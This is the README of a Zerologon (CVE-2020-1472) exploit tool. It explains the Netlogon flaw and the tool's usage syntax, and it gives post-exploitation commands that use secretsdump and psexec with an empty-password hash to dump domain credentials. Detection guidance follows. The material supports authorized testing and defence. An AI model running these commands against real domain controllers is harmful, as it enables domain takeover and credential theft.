# Zerologon (CVE-2020-1472)

## Overview

This project is an implementation of the **Zerologon vulnerability (CVE-2020-1472)**, one of the most critical Active Directory security vulnerabilities. This vulnerability allows an unauthenticated attacker to compromise the entire Active Directory domain by resetting the machine account password of the Domain Controller.

### CVSS Score: 10.0 (Critical)

## What is Zerologon?

Zerologon is a cryptographic flaw in Microsoft's Netlogon Remote Protocol (MS-NRPC). The vulnerability exists in the way Netlogon uses AES-CFB8 encryption with a hardcoded initialization vector (IV) of zero.

**Technical Summary:**
- The Netlogon protocol uses a challenge-response authentication mechanism
- Due to improper cryptographic implementation, an all-zero challenge has a 1/256 chance of producing a valid authentication
- An attacker can send ~2000 authentication attempts to reliably exploit this flaw
- Once authenticated, the attacker can reset the Domain Controller's machine account password to a known value (empty hash)

## How It Works

```
1. Target Selection
   └─> Identify Domain Controller (FQDN, NetBIOS name, machine account)

2. Challenge Phase (I_NetServerReqChallenge)
   └─> Send all-zero client challenge (0x0000000000000000)
   └─> Receive server challenge

3. Authentication Phase (I_NetServerAuthenticate2)
   └─> Attempt authentication with null credentials
   └─> Repeat until successful (~1/256 success rate per attempt)

4. Password Reset Phase (I_NetServerPasswordSet2)
   └─> Reset DC machine account password to empty
   └─> New NT hash: 31d6cfe0d16ae931b73c59d7e0c089c0 (empty password)

5. Post-Exploitation
   └─> Use Pass-the-Hash with empty credentials
   └─> Full domain compromise achieved
```

## Building the Project

### Prerequisites
- Windows development environment (Windows 10/11)
- Visual Studio 2022
- Windows SDK

### Compilation

**Using Visual Studio:**
```bash
1. Open Visual Studio
2. Select **Build Solution** from the **Build** menu.
```

## Usage

```cmd
Zerologon.exe <DC_FQDN> <DC_NetBIOS_Name> <Machine_Account_Name>
```

**Example:**
```cmd
Zerologon.exe DC01.corp.example.com DC01 DC01$
```

### Parameters:
- `DC_FQDN`: Fully Qualified Domain Name of the target Domain Controller
- `DC_NetBIOS_Name`: NetBIOS name of the DC (usually hostname)
- `Machine_Account_Name`: Machine account name (must end with $)

### Expected Output:

**Successful exploitation:**
```
[+] Targeting Domain Controller:
    FQDN           : DC01.corp.example.com
    NetBIOS Name   : DC01
    Machine Account: DC01$

[+] SUCCESS: Machine account password reset to empty!
[+] Now use Pass-the-Hash with:
      .\DC01$:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
[+] Then run: secretsdump.py -just-dc <domain>/<dc_account>@<dc_ip>
```

**Failed exploitation (patched system):**
```
[-] Attack failed after 2000 attempts. Target likely patched.
```

## Post-Exploitation

After successfully resetting the DC password, you can:

1. **Dump domain credentials:**
```bash
secretsdump.py -no-pass -just-dc 'DOMAIN/DC01$'@192.168.1.10
```

2. **Pass-the-Hash authentication:**
```bash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC01$'@DC01
```

## Detection

**Network-based detection:**
- Multiple failed Netlogon authentication attempts from single source
- Unusual patterns in MS-NRPC traffic
- IDS/IPS signatures for Zerologon exploitation

**Log-based detection:**
```
Event Viewer → Windows Logs → System
- Event ID 5827: Multiple password validation failures
- Event ID 5829: Secure channel reset
```

**SIEM Queries:**
```
source="WinEventLog:System" EventCode=5827 OR EventCode=5829
| stats count by Computer, SourceIP
| where count > 100
```

## Disclaimer

This tool is provided for **educational and authorized security research purposes only**.

**The author assumes NO responsibility for misuse of this code.**

## References

### Official Resources:
- [CVE-2020-1472 - NIST](https://nvd.nist.gov/vuln/detail/CVE-2020-1472)
- [Microsoft Security Advisory](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472)
- [Secura Research Paper](https://www.secura.com/blog/zero-logon)

### Technical Analysis:
- [Microsoft Netlogon Protocol Specification](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/)
- [Zerologon Technical Deep Dive](https://www.secura.com/pathtoimg.php?id=2055)

### Tools:
- [Impacket Toolkit](https://github.com/SecureAuthCorp/impacket) - For post-exploitation
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) - Credential extraction

## License

This project is licensed under the MIT License. For more information, see the [LICENSE file](LICENSE).